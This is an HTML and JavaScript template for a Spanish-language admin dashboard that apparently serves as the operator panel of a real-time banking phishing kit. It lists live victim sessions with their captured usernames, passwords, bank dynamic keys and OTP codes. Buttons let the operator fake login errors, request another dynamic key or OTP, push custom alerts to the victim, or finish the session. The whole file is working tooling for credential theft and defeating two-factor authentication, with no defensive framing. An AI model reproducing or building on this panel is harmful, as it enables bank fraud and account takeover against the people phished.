<!doctype html>
<html>

<head>
  <meta charset="utf-8">
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: Arial;
    }

    .wrap {
      display: flex;
      gap: 16px;
    }

    .list {
      width: 45%;
      border: 1px solid #ddd;
      padding: 12px;
    }

    .detail {
      width: 55%;
      border: 1px solid #ddd;
      padding: 12px;
    }

    .row {
      padding: 8px;
      border-bottom: 1px solid #eee;
      cursor: pointer;
    }

    .row:hover {
      background: #fafafa;
    }

    .badge {
      font-size: 12px;
      padding: 2px 6px;
      border: 1px solid #ccc;
      border-radius: 999px;
    }

    pre {
      background: #f5f5f5;
      padding: 10px;
    }
  </style>
</head>

<body>
  <h1>Dashboard Admin</h1>

  <div class="wrap">
    <div class="list">
      <h2>Sesiones</h2>
      <div id="sessionsList"></div>
    </div>

    <div class="detail">
      <h2>Detalle</h2>
      <div><b>Session:</b> <span id="selectedId">—</span></div>
      <div id="actions" style="margin:10px 0;"></div>
      <pre id="detailBox">{}</pre>
    </div>
  </div>

  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
  <script>
    const nodeUrl = @json($nodeUrl);
    let socket;
    let sessionsById = {};
    let selectedId = null;

    async function connectAdmin() {
      const r = await fetch("/admin/socket-token", { credentials: "same-origin" });
      const data = await r.json();
      console.log(data)
      if (!r.ok) {
        alert("No autenticado o no se pudo emitir token.");
        console.error(data);
        return;
      }

      socket = io(nodeUrl, {
        transports: ["websocket"],
        auth: { token: data.token },
      });

      // 3) ahora sí puedes usar socket.on
      socket.on("connect", () => {
        console.log("✅ admin socket connected:", socket.id);
      });

      socket.on("connect_error", (err) => {
        console.error("❌ connect_error:", err.message);
        alert("Socket error: " + err.message);
      });

      socket.on("admin:sessions:bootstrap", (sessions) => {
        sessionsById = {};
        console.log("bootstrap", sessions);

        (sessions || []).forEach(s => sessionsById[s.id] = s);

        renderList();
        if (selectedId) renderDetail(sessionsById[selectedId]);
      });

      socket.on("admin:sessions:upsert", (s) => {
        sessionsById[s.id] = s;
        renderList();
        if (selectedId === s.id) renderDetail(s);
      });

      socket.on("error:msg", (msg) => alert(msg));
    }

    function badge(state) { return `<span class="badge">${state}</span>`; }

    function renderList() {
      const items = Object.values(sessionsById)
        .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
      document.getElementById("sessionsList").innerHTML = items.map(s => `
      <div class="row" onclick="openSession('${s.id}')">
        <div>${badge(s.state)} <b>${s.id}</b></div>
        <div style="font-size:12px;color:#666">
          user: ${s.user ?? '-'} | pass: ${s.pass ?? '-'} | dinamic: ${s.dinamic ?? '-'} | otp: ${s.otp}
        </div>
      </div>
    `).join("");
    }

    function renderDetail(s) {
      console.log(s.id)
      document.getElementById("selectedId").textContent = s?.id ?? "—";
      document.getElementById("detailBox").textContent = JSON.stringify(s ?? {}, null, 2);

      const actions = document.getElementById("actions");
      actions.innerHTML = "";

      if (!s) return;

      switch (s.action) {
        case "AUTH_WAIT_ACTION":
          actions.innerHTML = `
            <button onclick="act('${s.id}','reject_auth')">Error Login</button>
            <button onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button onclick="act('${s.id}','request_otp')">Pedir otp</button>
          `;
          break;

        case "AUTH_ERROR":
          actions.innerHTML = `<span style="color:#666">Esperando nuevos datos</span>`;
          break;

        case "DINAMIC_WAIT_ACTION":
          actions.innerHTML = `
      <button onclick="act('${s.id}','reject_dinamic')">Error dinámica</button>
      <button onclick="act('${s.id}','request_otp')">Pedir OTP</button>
      <button onclick="act('${s.id}','finish')">Finalizar</button>
    `;
          break;

        case "DINAMIC_ERROR":
          actions.innerHTML = `<span style="color:#666">Esperando nueva dinámica</span>`;
          break;

        case "OTP_WAIT_ACTION":
          actions.innerHTML = `
            <button onclick="act('${s.id}','reject_otp')">Error OTP</button>
            <button onclick="act('${s.id}','custom_alert')">Alerta personalizada</button>
            <button onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button onclick="act('${s.id}','finish')">Finalizar</button>
          `;
          break;

        case "OTP_ERROR":
          actions.innerHTML = `<span style="color:#666">Esperando nuevo otp</span>`;
          break;

        default:
          actions.innerHTML = `<span style="color:#666">Sin acciones disponibles en este estado.</span>`;
      }
    }

    connectAdmin()

    window.openSession = function (id) {
      selectedId = id;
      renderDetail(sessionsById[id]);
    }

    window.act = function (sessionId, action) {
      let message = null;
      console.log(sessionId, action)
      if (action === "custom_alert") {
        message = prompt("Mensaje personalizado para el usuario:");
        if (message === null) return;
      }
      const eventName = `admin:${action}`;     // -> admin:reject_auth, admin:request_otp, etc.
      socket.emit(eventName, message ? { sessionId, message } : { sessionId });
    }
  </script>
</body>

</html>